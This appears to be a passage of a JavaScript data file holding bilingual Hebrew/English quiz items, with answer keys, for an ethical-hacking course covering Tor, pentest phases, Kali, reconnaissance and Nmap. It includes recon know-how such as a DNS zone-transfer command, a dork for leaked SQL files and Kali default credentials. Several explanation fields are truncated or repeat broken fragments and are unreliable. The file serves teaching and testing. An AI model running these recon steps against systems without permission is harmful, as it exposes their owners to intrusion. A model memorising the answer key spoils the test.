        "\u200Fה־FBI סגר את AlphaBay והמשטרה ההולנדית השתלטה על Hansa בסתר — משתמשים שברחו ל־Hansa נתפסו",
        "\u200Fמבצע לפריצת הצפנת Tor",
        "\u200Fמבצע לחסימת Tor ברוסיה",
        "\u200Fמבצע להשבתת Bitcoin"
      ],
      explanation: "‏ב־2017, ה־FBI סגר את AlphaBay (שוק Dark Web גדול).\n\nעיקרי:\n- במקביל, המשטרה ההולנדית כבר השתלטה על Hansa בסתר\n- משתמשי AlphaBay שברחו ל־Hansa לא ידעו שהוא נשלט על ידי המשטרה — ונתפסו\n- מלכודת דבש מתוחכמת",
      explanationEn: "In 2017, the FBI shut down AlphaBay (a major Dark Web market).\n\nMain Points:\n- Meanwhile, Dutch police had secretly taken over Hansa\n- AlphaBay users who fled to Hansa didn't know it was controlled by police — and were caught\n- A sophisticated honeypot",
      qEn: "What was Operation Bayonet and what was special about it?",
      correctEn: "FBI shut down AlphaBay and Dutch police secretly took over Hansa — users who fled to Hansa were caught",
      choicesEn: [
        "FBI shut down AlphaBay and Dutch police secretly took over Hansa — users who fled to Hansa were caught",
        "An operation to break Tor's encryption",
        "An operation to block Tor in Russia",
        "An operation to shut down Bitcoin"
      ]
    },
    {
      q: "\u200Fאיזה מדינות חוסמות או אוסרות שימוש ב־Tor?",
      correct: "\u200Fסין, רוסיה, איראן, בלארוס וטורקמניסטן — מדינות אוטוריטריות שחוסמות כלי פרטיות",
      choices: [
        "\u200Fסין, רוסיה, איראן, בלארוס וטורקמניסטן — מדינות אוטוריטריות שחוסמות כלי פרטיות",
        "\u200Fרק צפון קוריאה",
        "\u200Fכל מדינות האיחוד האירופי",
        "\u200Fארה\"ב וקנדה"
      ],
      explanation: "‏מדינות אוטוריטריות חוסמות Tor כחלק ממדיניות שליטה במידע.\n\nעיקרי:\n- סין משתמשת ב־Great Firewall, רוסיה חוסמת מ־2021\n- Tor מציע Bridges — נקודות כניסה לא פומביות שקשה יותר לחסום",
      explanationEn: "Authoritarian countries block Tor as part of information control policy.\n\nMain Points:\n- China uses the Great Firewall, Russia blocks since 2021\n- Tor offers Bridges — non-public entry points that are harder to block",
      qEn: "Which countries block or prohibit the use of Tor?",
      correctEn: "China, Russia, Iran, Belarus, and Turkmenistan — authoritarian countries that block privacy tools",
      choicesEn: [
        "China, Russia, Iran, Belarus, and Turkmenistan — authoritarian countries that block privacy tools",
        "Only North Korea",
        "All European Union countries",
        "USA and Canada"
      ]
    }
  ],

  // ===== RED TEAM (601-608) =====

  601: [
    {
      q: "\u200Fמה ההבדל בין White Hat ל־Black Hat?",
      correct: "\u200FWhite Hat פועל עם אישור כתוב ומדווח על ממצאים\nBlack Hat פועל ללא אישור ובכוונה זדונית",
      choices: [
        "\u200FWhite Hat פועל עם אישור כתוב ומדווח על ממצאים\nBlack Hat פועל ללא אישור ובכוונה זדונית",
        "\u200FWhite Hat תוקף רק Windows\nBlack Hat תוקף רק Linux",
        "\u200Fשניהם פועלים ללא אישור\nההבדל הוא ברמת המיומנות",
        "\u200FWhite Hat עובד רק עם Kali Linux\nBlack Hat עובד עם כל מערכת"
      ],
      explanation: "‏ההבדל המרכזי הוא שלושה דברים: אישור כתוב, כוונה טובה (להגן), ודיווח מלא על הממצאים.\n\nעיקרי:\n- Grey Hat פועל ללא אישור מפורש אבל לא בכוונה זדונית — עדיין לא חוקי",
      explanationEn: "The key difference is three things: written permission, good intent (to protect), and full disclosure of findings.\n\nMain Points:\n- Grey Hat acts without explicit permission but not maliciously — still illegal",
      qEn: "What is the difference between White Hat and Black Hat?",
      correctEn: "White Hat acts with written permission and reports findings\nBlack Hat acts without permission and with malicious intent",
      choicesEn: [
        "White Hat acts with written permission and reports findings\nBlack Hat acts without permission and with malicious intent",
        "White Hat only attacks Windows\nBlack Hat only attacks Linux",
        "Both act without permission\nThe difference is skill level",
        "White Hat only works with Kali Linux\nBlack Hat works with any system"
      ]
    },
    {
      q: "\u200Fמהם 5 השלבים של בדיקת חדירה (Penetration Testing)?",
      correct: "\u200FReconnaissance, Scanning, Exploitation, Post-Exploitation, Reporting",
      choices: [
        "\u200FReconnaissance, Scanning, Exploitation, Post-Exploitation, Reporting",
        "\u200FPlanning, Coding, Testing, Deployment, Maintenance",
        "\u200FInstall, Configure, Scan, Attack, Delete",
        "\u200FLogin, Upload, Execute, Download, Logout"
      ],
      explanation: "‏כל בדיקת חדירה מקצועית עוקבת אחרי 5 שלבים\n\nעיקרי:\n- איסוף מידע (Recon)\n- סריקה ומיפוי (Scanning)\n- ניצול חולשות (Exploitation)",
      explanationEn: "Every professional penetration test follows 5 phases: information gathering (Recon), scanning and mapping (Scanning), exploiting vulnerabilities (Exploitation), what to do with access (Post-Exploitation), and finally a detailed report (Reporting)..\n\nMain Points:\n- Every professional penetration test follows 5 phases: inform",
      qEn: "What are the 5 phases of a Penetration Test?",
      correctEn: "Reconnaissance, Scanning, Exploitation, Post-Exploitation, Reporting",
      choicesEn: [
        "Reconnaissance, Scanning, Exploitation, Post-Exploitation, Reporting",
        "Planning, Coding, Testing, Deployment, Maintenance",
        "Install, Configure, Scan, Attack, Delete",
        "Login, Upload, Execute, Download, Logout"
      ]
    },
    {
      q: "\u200Fמהו Responsible Disclosure ומהו זמן הסטנדרט לתיקון?",
      correct: "\u200Fדיווח ישיר לחברה, מתן זמן לתיקון (90 יום סטנדרט)\nורק אחרי שתוקן — פרסום פומבי",
      choices: [
        "\u200Fדיווח ישיר לחברה, מתן זמן לתיקון (90 יום סטנדרט)\nורק אחרי שתוקן — פרסום פומבי",
        "\u200Fפרסום מיידי ברשתות חברתיות\nללא הודעה לחברה",
        "\u200Fדיווח למשטרה בלבד\nללא פרסום כלל",
        "\u200Fמכירת החולשה לצד שלישי\nתוך 30 יום"
      ],
      explanation: "‏Responsible Disclosure (גילוי אחראי)\n\nעיקרי:\n- מדווחים ישירות לצוות האבטחה\n- נותנים 90 יום לתיקון (הסטנדרט של Google Project Zero)\n- ורק אחרי שתוקן מותר לפרסם בתיאום.",
      explanationEn: "Responsible Disclosure: report directly to the security team, give 90 days to fix (Google Project Zero standard), and only after it's fixed can you publish in coordination..\n\nMain Points:\n- Responsible Disclosure: report directly to the security team",
      qEn: "What is Responsible Disclosure and what is the standard fix timeline?",
      correctEn: "Report directly to the company, give time to fix (90 days standard)\nand only after fixed — publish publicly",
      choicesEn: [
        "Report directly to the company, give time to fix (90 days standard)\nand only after fixed — publish publicly",
        "Immediately publish on social media\nwithout notifying the company",
        "Report to police only\nno publishing at all",
        "Sell the vulnerability to a third party\nwithin 30 days"
      ]
    },
    {
      q: "\u200Fמהו CVE ומה מטרתו?",
      correct: "\u200FCommon Vulnerabilities and Exposures — מזהה ייחודי\nלכל חולשת אבטחה שפורסמה (לדוגמה CVE-2021-44228)",
      choices: [
        "\u200FCommon Vulnerabilities and Exposures — מזהה ייחודי\nלכל חולשת אבטחה שפורסמה (לדוגמה CVE-2021-44228)",
        "\u200Fתוכנה לסריקת חולשות\nשמותקנת על Kali Linux",
        "\u200Fסוג של התקפת סייבר\nשמכוונת לשרתי ווב בלבד",
        "\u200Fפרוטוקול הצפנה\nלתקשורת מאובטחת"
      ],
      explanation: "‏CVE (Common Vulnerabilities and Exposures) הוא מערכת מזהים ייחודיים לחולשות אבטחה מפורסמות.\n\nעיקרי:\n- לדוגמה: CVE-2021-44228 היא חולשת Log4Shell, אחת מהחולשות הגדולות בהיסטוריה",
      explanationEn: "CVE (Common Vulnerabilities and Exposures) is a system of unique identifiers for published security vulnerabilities.\n\nMain Points:\n- For example: CVE-2021-44228 is the Log4Shell vulnerability, one of the biggest in history",
      qEn: "What is CVE and what is its purpose?",
      correctEn: "Common Vulnerabilities and Exposures — a unique identifier\nfor each published security vulnerability (e.g. CVE-2021-44228)",
      choicesEn: [
        "Common Vulnerabilities and Exposures — a unique identifier\nfor each published security vulnerability (e.g. CVE-2021-44228)",
        "Software for scanning vulnerabilities\ninstalled on Kali Linux",
        "A type of cyber attack\ntargeting web servers only",
        "An encryption protocol\nfor secure communication"
      ]
    },
    {
      q: "\u200Fמהי תוכנית Bug Bounty?",
      correct: "\u200Fתוכנית שבה חברה מציעה פרסים כספיים\nלמי שמוצא ומדווח על חולשות אבטחה",
      choices: [
        "\u200Fתוכנית שבה חברה מציעה פרסים כספיים\nלמי שמוצא ומדווח על חולשות אבטחה",
        "\u200Fתוכנה שמוצאת באגים אוטומטית\nבזמן פיתוח",
        "\u200Fקורס הכשרה לבודקי חדירה\nשניתן אונליין בחינם",
        "\u200Fביטוח סייבר שחברות קונות\nמפני פריצות"
      ],
      explanation: "‏תוכניות Bug Bounty (כמו HackerOne ו־Bugcrowd) מאפשרות להאקרים אתיים לחפש חולשות עם אישור רשמי ולקבל פרס.\n\nעיקרי:\n- לדוגמה: PayPal שילם $15,300 לחוקר שמצא חולשה קריטית",
      explanationEn: "Bug Bounty programs (like HackerOne and Bugcrowd) allow ethical hackers to search for vulnerabilities with official permission and receive rewards.\n\nMain Points:\n- For example: PayPal paid $15,300 to a researcher who found a critical vulnerability",
      qEn: "What is a Bug Bounty program?",
      correctEn: "A program where a company offers monetary rewards\nto those who find and report security vulnerabilities",
      choicesEn: [
        "A program where a company offers monetary rewards\nto those who find and report security vulnerabilities",
        "Software that automatically finds bugs\nduring development",
        "A training course for penetration testers\navailable online for free",
        "Cyber insurance that companies buy\nagainst breaches"
      ]
    }
  ],
  602: [
    {
      q: "\u200Fמה היתרון המרכזי של התקנת Kali Linux על VirtualBox?",
      correct: "\u200Fסביבה מבודדת ובטוחה — אם משהו משתבש\nלא נפגעת מערכת ההפעלה הראשית",
      choices: [
        "\u200Fסביבה מבודדת ובטוחה — אם משהו משתבש\nלא נפגעת מערכת ההפעלה הראשית",
        "\u200Fביצועים טובים יותר\nמכל שיטת התקנה אחרת",
        "\u200Fלא צריך חיבור לאינטרנט\nבזמן ההתקנה",
        "\u200Fמגיע עם יותר כלים\nמאשר התקנה רגילה"
      ],
      explanation: "‏VirtualBox מספק סביבה מבודדת (sandbox) — אפשר לעשות Snapshot לפני ניסויים ולשחזר בקלות.\n\nעיקרי:\n- Dual Boot מספק ביצועים מלאים אבל טעות יכולה למחוק את Windows",
      explanationEn: "VirtualBox provides an isolated environment (sandbox) — you can take snapshots before experiments and restore easily.\n\nMain Points:\n- Dual Boot provides full performance but a mistake could wipe Windows",
      qEn: "What is the main advantage of installing Kali Linux on VirtualBox?",
      correctEn: "Isolated and safe environment — if something goes wrong\nthe host operating system is not affected",
      choicesEn: [
        "Isolated and safe environment — if something goes wrong\nthe host operating system is not affected",
        "Better performance\nthan any other installation method",
        "No internet connection needed\nduring installation",
        "Comes with more tools\nthan a regular installation"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין מצבי רשת NAT ל־Bridged ב־VirtualBox?",
      correct: "\u200FNAT — VM מבודד מהרשת עם IP פרטי מ־VirtualBox\nBridged — VM מקבל IP ישיר ברשת המקומית",
      choices: [
        "\u200FNAT — VM מבודד מהרשת עם IP פרטי מ־VirtualBox\nBridged — VM מקבל IP ישיר ברשת המקומית",
        "\u200FNAT מהיר יותר\nBridged בטוח יותר",
        "\u200FNAT לא מאפשר גישה לאינטרנט\nBridged כן",
        "\u200Fשניהם זהים\nההבדל הוא רק בשם"
      ],
      explanation: "‏NAT — ה־VM מקבל IP פרטי מ־VirtualBox ויכול לצאת לאינטרנט אבל מבודד.\n\nעיקרי:\n- Bridged — ה־VM מקבל IP ברשת המקומית, נדרש לסריקת מכונות ברשת\n- Host-Only — רק תקשורת בין Host ל־VM",
      explanationEn: "NAT — the VM gets a private IP from VirtualBox and can access internet but is isolated.\n\nMain Points:\n- Bridged — the VM gets an IP on the local network, needed for scanning network machines\n- Host-Only — only communication between Host and VM",
      qEn: "What is the difference between NAT and Bridged network modes in VirtualBox?",
      correctEn: "NAT — VM is isolated with a private IP from VirtualBox\nBridged — VM gets a direct IP on the local network",
      choicesEn: [
        "NAT — VM is isolated with a private IP from VirtualBox\nBridged — VM gets a direct IP on the local network",
        "NAT is faster\nBridged is safer",
        "NAT doesn't allow internet access\nBridged does",
        "Both are identical\nthe difference is only in name"
      ]
    },
    {
      q: "\u200Fמה פרטי הכניסה ברירת המחדל ב־Kali Linux?",
      correct: "\u200Fשם משתמש: kali\nסיסמה: kali",
      choices: [
        "\u200Fשם משתמש: kali\nסיסמה: kali",
        "\u200Fשם משתמש: root\nסיסמה: toor",
        "\u200Fשם משתמש: admin\nסיסמה: admin",
        "\u200Fשם משתמש: user\nסיסמה: password"
      ],
      explanation: "‏מאז 2020, ברירת המחדל ב־Kali היא kali/kali (לא root/toor כמו פעם).\n\nעיקרי:\n- חשוב לשנות את הסיסמה מיד עם הפקודה passwd kali",
      explanationEn: "Since 2020, the default in Kali is kali/kali (not root/toor as before).\n\nMain Points:\n- It's important to change the password immediately with the command passwd kali",
      qEn: "What are the default login credentials in Kali Linux?",
      correctEn: "Username: kali\nPassword: kali",
      choicesEn: [
        "Username: kali\nPassword: kali",
        "Username: root\nPassword: toor",
        "Username: admin\nPassword: admin",
        "Username: user\nPassword: password"
      ]
    },
    {
      q: "\u200Fאיזו פקודה מעדכנת את כל חבילות Kali Linux?",
      correct: "\u200Fsudo apt update && sudo apt full-upgrade -y",
      choices: [
        "\u200Fsudo apt update && sudo apt full-upgrade -y",
        "\u200Fsudo yum update -y",
        "\u200Fkali-update --all",
        "\u200Fsudo apt install kali -y"
      ],
      explanation: "‏apt update מרענן את רשימת החבילות הזמינות, ו-apt full-upgrade משדרג את כל החבילות המותקנות כולל שינויי תלויות.\n\nעיקרי:\n- הדגל -y מאשר אוטומטית",
      explanationEn: "apt update refreshes the list of available packages, and apt full-upgrade upgrades all installed packages including dependency changes.\n\nMain Points:\n- The -y flag auto-confirms",
      qEn: "Which command updates all Kali Linux packages?",
      correctEn: "sudo apt update && sudo apt full-upgrade -y",
      choicesEn: [
        "sudo apt update && sudo apt full-upgrade -y",
        "sudo yum update -y",
        "kali-update --all",
        "sudo apt install kali -y"
      ]
    },
    {
      q: "\u200Fמהי DVWA ולמה משתמשים בה?",
      correct: "\u200FDamn Vulnerable Web Application — אפליקציה שנבנתה בכוונה\nעם חולשות אבטחה לתרגול בסביבה בטוחה",
      choices: [
        "\u200FDamn Vulnerable Web Application — אפליקציה שנבנתה בכוונה\nעם חולשות אבטחה לתרגול בסביבה בטוחה",
        "\u200Fכלי סריקת חולשות אוטומטי\nשמותקן על Kali",
        "\u200Fפלטפורמת Bug Bounty\nלדיווח על חולשות",
        "\u200Fאנטי-וירוס מתקדם\nלהגנה על שרתי ווב"
      ],
      explanation: "‏DVWA (Damn Vulnerable Web Application) היא אפליקציית ווב שנבנתה בכוונה עם חולשות כמו XSS, SQLi, ועוד — כדי לתרגל תקיפה בסביבה חוקית ובטוחה.\n\nעיקרי:\n- פלטפורמות תרגול נוספות: HackTheBox, TryHackMe, VulnHub",
      explanationEn: "DVWA (Damn Vulnerable Web Application) is a web app intentionally built with vulnerabilities like XSS, SQLi, and more — for practicing attacks in a legal, safe environment.\n\nMain Points:\n- Other platforms: HackTheBox, TryHackMe, VulnHub",
      qEn: "What is DVWA and what is it used for?",
      correctEn: "Damn Vulnerable Web Application — an app intentionally built\nwith security vulnerabilities for practice in a safe environment",
      choicesEn: [
        "Damn Vulnerable Web Application — an app intentionally built\nwith security vulnerabilities for practice in a safe environment",
        "An automated vulnerability scanner\ninstalled on Kali",
        "A Bug Bounty platform\nfor reporting vulnerabilities",
        "An advanced antivirus\nfor protecting web servers"
      ]
    }
  ],
  603: [
    {
      q: "\u200Fמה ההבדל בין Passive Recon ל־Active Recon?",
      correct: "\u200FPassive — איסוף מידע ללא מגע ישיר עם המטרה\nActive — מגע ישיר שעלול להירשם בלוגים",
      choices: [
        "\u200FPassive — איסוף מידע ללא מגע ישיר עם המטרה\nActive — מגע ישיר שעלול להירשם בלוגים",
        "\u200FPassive — סריקת פורטים\nActive — הזרקת SQL",
        "\u200FPassive — תקיפה שקטה\nActive — תקיפה רועשת",
        "\u200Fשניהם דורשים מגע ישיר\nההבדל הוא במהירות"
      ],
      explanation: "‏Passive Recon: חיפוש Google, Whois, רשתות חברתיות — המטרה לא יודעת שחוקרים אותה.\n\nעיקרי:\n- Active Recon: סריקת פורטים, DNS queries ישירים — נרשם בלוגים של המטרה",
      explanationEn: "Passive Recon: Google search, Whois, social media — the target doesn't know it's being researched.\n\nMain Points:\n- Active Recon: port scanning, direct DNS queries — gets logged by the target",
      qEn: "What is the difference between Passive Recon and Active Recon?",
      correctEn: "Passive — gathering info without direct contact with target\nActive — direct contact that may be logged",
      choicesEn: [
        "Passive — gathering info without direct contact with target\nActive — direct contact that may be logged",
        "Passive — port scanning\nActive — SQL injection",
        "Passive — quiet attack\nActive — noisy attack",
        "Both require direct contact\nthe difference is speed"
      ]
    },
    {
      q: "\u200Fמהי Google Dork ואיך מוצאים קבצי PDF באתר ספציפי?",
      correct: "\u200Fשימוש באופרטורים מתקדמים בגוגל\nלדוגמה: site:example.com filetype:pdf",
      choices: [
        "\u200Fשימוש באופרטורים מתקדמים בגוגל\nלדוגמה: site:example.com filetype:pdf",
        "\u200Fתוכנה חיצונית שסורקת אתרים\nומורידה קבצים אוטומטית",
        "\u200Fהתקנת תוסף בדפדפן\nשמחפש קבצים מוסתרים",
        "\u200Fפריצה לשרת\nוהורדת כל הקבצים"
      ],
      explanation: "‏Google Dorking הוא שימוש באופרטורים כמו site:, filetype:, inurl:, intitle: לחיפוש ממוקד.\n\nעיקרי:\n- לדוגמה: site:example.com filetype:sql יכול לחשוף מסדי נתונים שדלפו\n- זה חוקי (חיפוש גוגל) אבל שימוש במידע ללא אישור — לא",
      explanationEn: "Google Dorking uses operators like site:, filetype:, inurl:, intitle: for targeted searches.\n\nMain Points:\n- For example: site:example.com filetype:sql could reveal leaked databases\n- This is legal (Google search) but using found info without permission — isn't",
      qEn: "What is a Google Dork and how do you find PDF files on a specific site?",
      correctEn: "Using advanced Google operators\nfor example: site:example.com filetype:pdf",
      choicesEn: [
        "Using advanced Google operators\nfor example: site:example.com filetype:pdf",
        "External software that scans websites\nand downloads files automatically",
        "Installing a browser extension\nthat searches for hidden files",
        "Hacking into the server\nand downloading all files"
      ]
    },
    {
      q: "\u200Fמה עושה Shodan ובמה הוא שונה מגוגל?",
      correct: "\u200FShodan סורק מכשירים מחוברים לאינטרנט (שרתים, IoT)\nגוגל מאנדקס דפי ווב בלבד",
      choices: [
        "\u200FShodan סורק מכשירים מחוברים לאינטרנט (שרתים, IoT)\nגוגל מאנדקס דפי ווב בלבד",
        "\u200FShodan מהיר יותר מגוגל\nאבל עם פחות תוצאות",
        "\u200FShodan מחפש רק ב־Dark Web\nגוגל מחפש ב־Surface Web",
        "\u200Fשניהם מחפשים דפי ווב\nההבדל הוא בממשק"
      ],
      explanation: "‏Shodan הוא 'מנוע חיפוש ל־IoT' — סורק את כל האינטרנט ומאנדקס מכשירים מחוברים לפי פורטים ושירותים (שרתים, מצלמות, ראוטרים, SCADA).\n\nעיקרי:\n- פילטרים: port:, country:, org:, vuln:",
      explanationEn: "Shodan is a 'search engine for IoT' — scans the entire internet and indexes connected devices by ports and services (servers, cameras, routers, SCADA).\n\nMain Points:\n- Filters: port:, country:, org:, vuln:",
      qEn: "What does Shodan do and how is it different from Google?",
      correctEn: "Shodan scans internet-connected devices (servers, IoT)\nGoogle indexes web pages only",
      choicesEn: [
        "Shodan scans internet-connected devices (servers, IoT)\nGoogle indexes web pages only",
        "Shodan is faster than Google\nbut with fewer results",
        "Shodan searches only the Dark Web\nGoogle searches the Surface Web",
        "Both search web pages\nthe difference is the interface"
      ]
    },
    {
      q: "\u200Fמהו Phishing ומה הטכניקה שבבסיסו?",
      correct: "\u200Fשליחת דוא\"ל/הודעה מזויפת שנראית לגיטימית\nכדי לגנוב credentials — מנצל אמון אנושי",
      choices: [
        "\u200Fשליחת דוא\"ל/הודעה מזויפת שנראית לגיטימית\nכדי לגנוב credentials — מנצל אמון אנושי",
        "\u200Fסריקת פורטים פתוחים\nבשרת מרוחק",
        "\u200Fהזרקת קוד JavaScript\nלדף ווב פגיע",
        "\u200Fפריצת סיסמה\nבשיטת brute force"
      ],
      explanation: "‏Phishing היא טכניקת הנדסה חברתית (Social Engineering) שמנצלת אמון ודחיפות — 'חשבונך ייחסם תוך 24 שעות'.\n\nעיקרי:\n- טכניקות נוספות: Pretexting (התחזות), Baiting (USB נגוע), Tailgating (כניסה פיזית אחרי עובד)",
      explanationEn: "Phishing is a Social Engineering technique that exploits trust and urgency — 'Your account will be blocked in 24 hours'.\n\nMain Points:\n- Other techniques: Pretexting (impersonation), Baiting (infected USB), Tailgating (physical entry behind an employee)",
      qEn: "What is Phishing and what technique is it based on?",
      correctEn: "Sending a fake email/message that looks legitimate\nto steal credentials — exploits human trust",
      choicesEn: [
        "Sending a fake email/message that looks legitimate\nto steal credentials — exploits human trust",
        "Scanning open ports\non a remote server",
        "Injecting JavaScript code\ninto a vulnerable web page",
        "Cracking a password\nusing brute force"
      ]
    },
    {
      q: "\u200Fמה עושה DNS Zone Transfer ולמה הוא מסוכן?",
      correct: "\u200Fמעביר את כל רשומות ה־DNS של דומיין — חושף\nסאב-דומיינים, שרתים פנימיים ומבנה הרשת",
      choices: [
        "\u200Fמעביר את כל רשומות ה־DNS של דומיין — חושף\nסאב-דומיינים, שרתים פנימיים ומבנה הרשת",
        "\u200Fמשנה את כתובת ה־DNS של הדומיין\nלשרת אחר",
        "\u200Fמוחק את כל רשומות ה־DNS\nשל הדומיין",
        "\u200Fמצפין את תעבורת ה־DNS\nלמניעת האזנה"
      ],
      explanation: "‏DNS Zone Transfer (AXFR) מעביר את כל רשומות ה־DNS מהשרת — אם השרת לא מוגן, התוקף מקבל מפה מלאה של כל הסאב-דומיינים והשרתים.\n\nעיקרי:\n- פקודה: dig axfr @ns1.example.com example.com",
      explanationEn: "DNS Zone Transfer (AXFR) transfers all DNS records from the server — if the server is unprotected, the attacker gets a full map of all subdomains and servers.\n\nMain Points:\n- Command: dig axfr @ns1.example.com example.com",
      qEn: "What does DNS Zone Transfer do and why is it dangerous?",
      correctEn: "Transfers all DNS records for a domain — exposes\nsubdomains, internal servers and network structure",
      choicesEn: [
        "Transfers all DNS records for a domain — exposes\nsubdomains, internal servers and network structure",
        "Changes the DNS address of the domain\nto another server",
        "Deletes all DNS records\nof the domain",
        "Encrypts DNS traffic\nto prevent eavesdropping"
      ]
    }
  ],
  604: [
    {
      q: "\u200Fמה ההבדל בין SYN Scan (-sS) ל־TCP Connect Scan (-sT)?",
      correct: "\u200FSYN Scan לא משלים handshake (פחות עקבות, צריך root)\nTCP Connect משלים handshake מלא (יותר גלוי, לא צריך root)",
      choices: [
        "\u200FSYN Scan לא משלים handshake (פחות עקבות, צריך root)\nTCP Connect משלים handshake מלא (יותר גלוי, לא צריך root)",
        "\u200FSYN Scan סורק UDP\nTCP Connect סורק TCP",
        "\u200FSYN Scan איטי יותר אבל מדויק\nTCP Connect מהיר אבל לא מדויק",
        "\u200Fשניהם זהים\nההבדל הוא רק בשם"
      ],
      explanation: "‏SYN Scan (חצי-פתוח): שולח SYN, מקבל SYN-ACK אם פתוח, שולח RST במקום ACK — לא משלים handshake, פחות רישום בלוגים, דורש root.\n\nעיקרי:\n- TCP Connect: משלים 3-way handshake מלא — יותר גלוי אבל לא צריך root",
      explanationEn: "SYN Scan (half-open): sends SYN, gets SYN-ACK if open, sends RST instead of ACK — doesn't complete handshake, less logging, requires root.\n\nMain Points:\n- TCP Connect: completes full 3-way handshake — more visible but doesn't require root",
      qEn: "What is the difference between SYN Scan (-sS) and TCP Connect Scan (-sT)?",
      correctEn: "SYN Scan doesn't complete handshake (less traces, needs root)\nTCP Connect completes full handshake (more visible, no root needed)",
      choicesEn: [
        "SYN Scan doesn't complete handshake (less traces, needs root)\nTCP Connect completes full handshake (more visible, no root needed)",
        "SYN Scan scans UDP\nTCP Connect scans TCP",
        "SYN Scan is slower but accurate\nTCP Connect is fast but inaccurate",
        "Both are identical\nthe difference is only in name"
      ]
    },
    {
      q: "\u200Fמה המשמעות של PORT STATE 'filtered' בתוצאות Nmap?",
      correct: "\u200Ffirewall או מנגנון סינון חוסם את הפורט\nNmap לא יכול לקבוע אם הפורט פתוח או סגור",
      choices: [
        "\u200Ffirewall או מנגנון סינון חוסם את הפורט\nNmap לא יכול לקבוע אם הפורט פתוח או סגור",
        "\u200Fהפורט פתוח אבל מוגן בסיסמה\nצריך credentials כדי להתחבר",
        "\u200Fהפורט סגור לצמיתות\nולא ניתן לפתוח אותו",
        "\u200Fהפורט פתוח רק לכתובות IP מסוימות\nאבל לא לכולם"
      ],
      explanation: "‏שלושת המצבים של פורט ב־Nmap\n\nעיקרי:\n- open (פתוח\n- שירות מקשיב)\n- closed (סגור",
      explanationEn: "Three port states in Nmap: open (service is listening), closed (no service), filtered (firewall is blocking — no response, cannot determine if open or closed)..\n\nMain Points:\n- Three port states in Nmap: open (service is listening), clos",
      qEn: "What does PORT STATE 'filtered' mean in Nmap results?",
      correctEn: "A firewall or filtering mechanism is blocking the port\nNmap cannot determine if the port is open or closed",
      choicesEn: [
        "A firewall or filtering mechanism is blocking the port\nNmap cannot determine if the port is open or closed",
        "The port is open but password protected\ncredentials are needed to connect",
        "The port is permanently closed\nand cannot be opened",
        "The port is open only for certain IP addresses\nbut not for everyone"
      ]
    },
    {
      q: "\u200Fמה עושה Nmap NSE (Nmap Scripting Engine)?",
      correct: "\u200Fמריץ סקריפטים מובנים לגילוי חולשות ומידע נוסף\nלדוגמה: --script vuln לסריקת חולשות",
      choices: [
        "\u200Fמריץ סקריפטים מובנים לגילוי חולשות ומידע נוסף\nלדוגמה: --script vuln לסריקת חולשות",
        "\u200Fמצפין את תוצאות הסריקה\nלשמירה מאובטחת",
        "\u200Fמאיץ את הסריקה\nבעזרת חישוב מקבילי",
        "\u200Fמייצר דוחות PDF אוטומטיים\nמתוצאות הסריקה"
      ],
      explanation: "‏Nmap Scripting Engine (NSE)\n\nעיקרי:\n- כולל מאות סקריפטים מובנים\n- --script vuln (חולשות נפוצות)\n- --script smb-vuln* (חולשות SMB)",
      explanationEn: "Nmap Scripting Engine (NSE) includes hundreds of built-in scripts: --script vuln (common vulnerabilities), --script smb-vuln* (SMB vulnerabilities), --script http-headers (check headers), --script safe (all safe scripts)..\n\nMain Points:\n- Nmap Scripting Engine (NSE) includes hundreds of built-in sc",
      qEn: "What does Nmap NSE (Nmap Scripting Engine) do?",
      correctEn: "Runs built-in scripts to discover vulnerabilities and additional info\nfor example: --script vuln for vulnerability scanning",
      choicesEn: [
        "Runs built-in scripts to discover vulnerabilities and additional info\nfor example: --script vuln for vulnerability scanning",
        "Encrypts scan results\nfor secure storage",
        "Speeds up the scan\nusing parallel computation",
        "Generates automatic PDF reports\nfrom scan results"
      ]
    },
    {
      q: "\u200Fלמה חשוב לסרוק גם פורטי UDP ולא רק TCP?",
      correct: "\u200Fשירותים חשובים כמו DNS (53), SNMP (161), DHCP (67/68)\nרצים על UDP — התעלמות מהם מפספסת חולשות",
      choices: [
        "\u200Fשירותים חשובים כמו DNS (53), SNMP (161), DHCP (67/68)\nרצים על UDP — התעלמות מהם מפספסת חולשות",
        "\u200FUDP מהיר יותר לסריקה\nולכן חוסך זמן",
        "\u200Fפורטי UDP תמיד פתוחים\nולכן קל יותר לנצל אותם",
        "\u200FFirewall לא חוסם UDP\nולכן הסריקה תמיד מצליחה"
      ],
      explanation: "‏סריקת UDP (-sU) חשובה כי שירותים קריטיים רצים עליו: DNS (53), SNMP (161) — שיכול לחשוף מידע רגיש עם community string 'public', DHCP (67/68).\n\nעיקרי:\n- סריקת UDP איטית יותר אבל הכרחית",
      explanationEn: "UDP scanning (-sU) is important because critical services run on it: DNS (53), SNMP (161) — which can expose sensitive info with community string 'public', DHCP (67/68).\n\nMain Points:\n- UDP scanning is slower but essential",
      qEn: "Why is it important to also scan UDP ports, not just TCP?",
      correctEn: "Important services like DNS (53), SNMP (161), DHCP (67/68)\nrun on UDP — ignoring them misses vulnerabilities",
      choicesEn: [
        "Important services like DNS (53), SNMP (161), DHCP (67/68)\nrun on UDP — ignoring them misses vulnerabilities",
        "UDP is faster to scan\nso it saves time",
        "UDP ports are always open\nso they're easier to exploit",
        "Firewalls don't block UDP\nso scanning always succeeds"
      ]
    },
    {
      q: "\u200Fמה עושים Dirb ו־Gobuster?",
      correct: "\u200Fסורקים ספריות וקבצים נסתרים בשרת ווב\nבעזרת wordlist (רשימת שמות נפוצים)",
      choices: [
        "\u200Fסורקים ספריות וקבצים נסתרים בשרת ווב\nבעזרת wordlist (רשימת שמות נפוצים)",
        "\u200Fסורקים פורטים פתוחים\nבמכונה מרוחקת",
        "\u200Fפורצים סיסמאות של משתמשים\nבשרת",
        "\u200Fמגנים על שרת ווב\nמפני התקפות"
      ],
      explanation: "‏Dirb ו־Gobuster הם כלי Directory Brute Force — מנסים שמות ספריות וקבצים מ-wordlist ובודקים אם הם קיימים (200/301/403).\n\nעיקרי:\n- Gobuster מהיר יותר (כתוב ב־Go, multi-threaded) ותומך גם ב־DNS ו־VHost scanning",
      explanationEn: "Dirb and Gobuster are Directory Brute Force tools — they try directory and file names from a wordlist and check if they exist (200/301/403).\n\nMain Points:\n- Gobuster is faster (written in Go, multi-threaded) and also supports DNS and VHost scanning",
      qEn: "What do Dirb and Gobuster do?",
      correctEn: "Scan for hidden directories and files on a web server\nusing a wordlist (list of common names)",
      choicesEn: [
        "Scan for hidden directories and files on a web server\nusing a wordlist (list of common names)",
        "Scan for open ports\non a remote machine",
        "Crack user passwords\non a server",
        "Protect a web server\nfrom attacks"
      ]
    }
  ],
